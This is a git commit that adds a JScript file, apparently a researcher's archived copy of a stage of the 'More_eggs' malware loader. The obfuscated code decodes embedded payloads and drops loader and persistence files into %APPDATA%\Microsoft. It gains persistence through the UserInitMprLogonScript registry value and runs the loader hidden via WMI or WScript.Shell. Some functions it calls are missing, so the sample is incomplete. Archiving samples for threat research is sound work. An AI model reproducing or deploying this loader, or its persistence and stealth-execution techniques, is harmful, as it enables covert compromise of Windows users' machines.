efbc3dacb59354f0c21d9914d083f8497865f13f
StrangerealIntel <54320855+StrangerealIntel@users.noreply.github.com>
2023-03-10 19:59:29 +0100

    Create layer1.js

---
+++ moreeggs/2023-03-10/layer1.js
@@ -0,0 +1,215 @@
+function ZwukqYMlmCrDMz628(ffHCEkgvartnGtJ924) {
+    return ffHCEkgvartnGtJ924.length;
+}
+
+function cjUaEHJ817(QzolvlzOlDubnq479) {
+    return new ActiveXObject(QzolvlzOlDubnq479);
+}
+
+function YlimsQiHLFJsSku837(JspJTCAek534) {
+    return String.fromCharCode(JspJTCAek534);
+}
+
+function Writefile(filename, text) {
+    objFSO = cjUaEHJ817("Scripting.FileSystemObject");
+    a = objFSO.CreateTextFile(filename, 2);
+    a.Write(text);
+    a.Close();
+}
+
+function WGNudqAv776(BxCKfaJFFJBI463) {
+    var tabchar = [];
+    var TFieOzGWsyb501 = [];
+    var koodyaMKgUdu815 = "";
+    var ERzLsRYP605;
+    var nqPFZEGAk595;
+    var i = 0;
+    tabchar[0x80] = 0x00C7;
+    tabchar[0x81] = 0x00FC;
+    tabchar[0x82] = 0x00E9;
+    tabchar[0x83] = 0x00E2;
+    tabchar[0x84] = 0x00E4;
+    tabchar[0x85] = 0x00E0;
+    tabchar[0x86] = 0x00E5;
+    tabchar[0x87] = 0x00E7;
+    tabchar[0x88] = 0x00EA;
+    tabchar[0x89] = 0x00EB;
+    tabchar[0x8A] = 0x00E8;
+    tabchar[0x8B] = 0x00EF;
+    tabchar[0x8C] = 0x00EE;
+    tabchar[0x8D] = 0x00EC;
+    tabchar[0x8E] = 0x00C4;
+    tabchar[0x8F] = 0x00C5;
+    tabchar[0x90] = 0x00C9;
+    tabchar[0x91] = 0x00E6;
+    tabchar[0x92] = 0x00C6;
+    tabchar[0x93] = 0x00F4;
+    tabchar[0x94] = 0x00F6;
+    tabchar[0x95] = 0x00F2;
+    tabchar[0x96] = 0x00FB;
+    tabchar[0x97] = 0x00F9;
+    tabchar[0x98] = 0x00FF;
+    tabchar[0x99] = 0x00D6;
+    tabchar[0x9A] = 0x00DC;
+    tabchar[0x9B] = 0x00A2;
+    tabchar[0x9C] = 0x00A3;
+    tabchar[0x9D] = 0x00A5;
+    tabchar[0x9E] = 0x20A7;
+    tabchar[0x9F] = 0x0192;
+    tabchar[0xA0] = 0x00E1;
+    tabchar[0xA1] = 0x00ED;
+    tabchar[0xA2] = 0x00F3;
+    tabchar[0xA3] = 0x00FA;
+    tabchar[0xA4] = 0x00F1;
+    tabchar[0xA5] = 0x00D1;
+    tabchar[0xA6] = 0x00AA;
+    tabchar[0xA7] = 0x00BA;
+    tabchar[0xA8] = 0x00BF;
+    tabchar[0xA9] = 0x2310;
+    tabchar[0xAA] = 0x00AC;
+    tabchar[0xAB] = 0x00BD;
+    tabchar[0xAC] = 0x00BC;
+    tabchar[0xAD] = 0x00A1;
+    tabchar[0xAE] = 0x00AB;
+    tabchar[0xAF] = 0x00BB;
+    tabchar[0xB0] = 0x2591;
+    tabchar[0xB1] = 0x2592;
+    tabchar[0xB2] = 0x2593;
+    tabchar[0xB3] = 0x2502;
+    tabchar[0xB4] = 0x2524;
+    tabchar[0xB5] = 0x2561;
+    tabchar[0xB6] = 0x2562;
+    tabchar[0xB7] = 0x2556;
+    tabchar[0xB8] = 0x2555;
+    tabchar[0xB9] = 0x2563;
+    tabchar[0xBA] = 0x2551;
+    tabchar[0xBB] = 0x2557;
+    tabchar[0xBC] = 0x255D;
+    tabchar[0xBD] = 0x255C;
+    tabchar[0xBE] = 0x255B;
+    tabchar[0xBF] = 0x2510;
+    tabchar[0xC0] = 0x2514;
+    tabchar[0xC1] = 0x2534;
+    tabchar[0xC2] = 0x252C;
+    tabchar[0xC3] = 0x251C;
+    tabchar[0xC4] = 0x2500;
+    tabchar[0xC5] = 0x253C;
+    tabchar[0xC6] = 0x255E;
+    tabchar[0xC7] = 0x255F;
+    tabchar[0xC8] = 0x255A;
+    tabchar[0xC9] = 0x2554;
+    tabchar[0xCA] = 0x2569;
+    tabchar[0xCB] = 0x2566;
+    tabchar[0xCC] = 0x2560;
+    tabchar[0xCD] = 0x2550;
+    tabchar[0xCE] = 0x256C;
+    tabchar[0xCF] = 0x2567;
+    tabchar[0xD0] = 0x2568;
+    tabchar[0xD1] = 0x2564;
+    tabchar[0xD2] = 0x2565;
+    tabchar[0xD3] = 0x2559;
+    tabchar[0xD4] = 0x2558;
+    tabchar[0xD5] = 0x2552;
+    tabchar[0xD6] = 0x2553;
+    tabchar[0xD7] = 0x256B;
+    tabchar[0xD8] = 0x256A;
+    tabchar[0xD9] = 0x2518;
+    tabchar[0xDA] = 0x250C;
+    tabchar[0xDB] = 0x2588;
+    tabchar[0xDC] = 0x2584;
+    tabchar[0xDD] = 0x258C;
+    tabchar[0xDE] = 0x2590;
+    tabchar[0xDF] = 0x2580;
+    tabchar[0xE0] = 0x03B1;
+    tabchar[0xE1] = 0x00DF;
+    tabchar[0xE2] = 0x0393;
+    tabchar[0xE3] = 0x03C0;
+    tabchar[0xE4] = 0x03A3;
+    tabchar[0xE5] = 0x03C3;
+    tabchar[0xE6] = 0x00B5;
+    tabchar[0xE7] = 0x03C4;
+    tabchar[0xE8] = 0x03A6;
+    tabchar[0xE9] = 0x0398;
+    tabchar[0xEA] = 0x03A9;
+    tabchar[0xEB] = 0x03B4;
+    tabchar[0xEC] = 0x221E;
+    tabchar[0xED] = 0x03C6;
+    tabchar[0xEE] = 0x03B5;
+    tabchar[0xEF] = 0x2229;
+    tabchar[0xF0] = 0x2261;
+    tabchar[0xF1] = 0x00B1;
+    tabchar[0xF2] = 0x2265;
+    tabchar[0xF3] = 0x2264;
+    tabchar[0xF4] = 0x2320;
+    tabchar[0xF5] = 0x2321;
+    tabchar[0xF6] = 0x00F7;
+    tabchar[0xF7] = 0x2248;
+    tabchar[0xF8] = 0x00B0;
+    tabchar[0xF9] = 0x2219;
+    tabchar[0xFA] = 0x00B7;
+    tabchar[0xFB] = 0x221A;
+    tabchar[0xFC] = 0x207F;
+    tabchar[0xFD] = 0x00B2;
+    tabchar[0xFE] = 0x25A0;
+    tabchar[0xFF] = 0x00A0;
+    do {
+        ERzLsRYP605 = BxCKfaJFFJBI463[i];
+        if (ERzLsRYP605 < (1469 - 1341)) {
+            nqPFZEGAk595 = ERzLsRYP605;
+        } else {
+            nqPFZEGAk595 = tabchar[ERzLsRYP605];
+        }
+        TFieOzGWsyb501.push(YlimsQiHLFJsSku837(nqPFZEGAk595));
+        i += 1;
+    } while (i < ZwukqYMlmCrDMz628(BxCKfaJFFJBI463));
+    koodyaMKgUdu815 = TFieOzGWsyb501.join("");
+    return koodyaMKgUdu815;
+}
+var WScriptShell = cjUaEHJ817(tCMmGKYqgvwJ662(xscIdyUMq895, xneVbdWYf937));
+var KirScMIdPp711 = WScriptShell.ExpandEnvironmentStrings("%appdata%");
+KirScMIdPp711 = KirScMIdPp711 + "\\Microsoft\\";
+var LoaderFileName = "HBIDJJCS0NHUZM3EG.txt";
+var PersFileName = "LR9UGMJQ1WE2TQTKAG.txt";
+var kljqkmtize864 = KirScMIdPp711 + "WScript.Shell";
+var Decoded = uCYdPplLVsJT680(VViyBZL680, VViyBZL680.length);
+var ba = CcZcxtiMxW668(Decoded, xneVbdWYf937);
+var objFSO = cjUaEHJ817("Scripting.FileSystemObject");
+if (!objFSO.FileExists(kljqkmtize864)) {
+    var actxobj = cjUaEHJ817("ADODB.Stream"));
+actxobj.open();
+actxobj.position = 0;
+actxobj.type = 2;
+actxobj.charset = (3079 - 2642);
+actxobj.writeText(WGNudqAv776(ba));
+payload = 0;
+actxobj.saveToFile(kljqkmtize864);
+actxobj.close();
+}
+var qkMtbsmMnpPpsXT956 = uCYdPplLVsJT680(NwTfSQFrI783, NwTfSQFrI783.length);
+var BBA = CcZcxtiMxW668(qkMtbsmMnpPpsXT956, xneVbdWYf937);
+var pays = WGNudqAv776(BBA);
+Writefile(KirScMIdPp711 + LoaderFileName, pays);
+var DecodedPers = uCYdPplLVsJT680(dXGLzZD585, dXGLzZD585.length);
+var BBS = CcZcxtiMxW668(DecodedPers, xneVbdWYf937);
+var PersPays = WGNudqAv776(BBS);
+Writefile(KirScMIdPp711 + PersFileName, PersPays);
+var pMnuowFoZMV496 = cjUaEHJ817("WScript.Shell");
+var RJhwrtVRl790 = 'cmd /c start /min "" "' + kljqkmtize864 + '" "' + KirScMIdPp711 + LoaderFileName + '"' + ' "' + KirScMIdPp711 + LoaderFileName + '"';
+try {
+    pMnuowFoZMV496.RegWrite('"HKCU\\Environment\\UserInitMprLogonScript"', 'cscript /b /e:jscript "%APPDATA%\\Microsoft\\' + PersFileName + '"');
+    }
+    catch (e) {}
+    try {
+        var vkxvlqbn570 = GetObject("winmgmts:{impersonationLevel=impersonate}!\.ootcimv2");
+        var vkxvlqbn72 = vkxvlqbn570.Get("Win32_Process").Create(RJhwrtVRl790, null, null, 0);
+        if (vkxvlqbn72 !== 0) {
+            vkxvlqbn354;
+        }
+    } catch (vkxvlqbn3118) {
+        try {
+            pMnuowFoZMV496.Run(RJhwrtVRl790, 0, 0);
+            vkxvlqbn0937 = 1;
+        } catch (vkxvlqbn4910) {
+            vkxvlqbn0937 = 0;
+        }
+    }
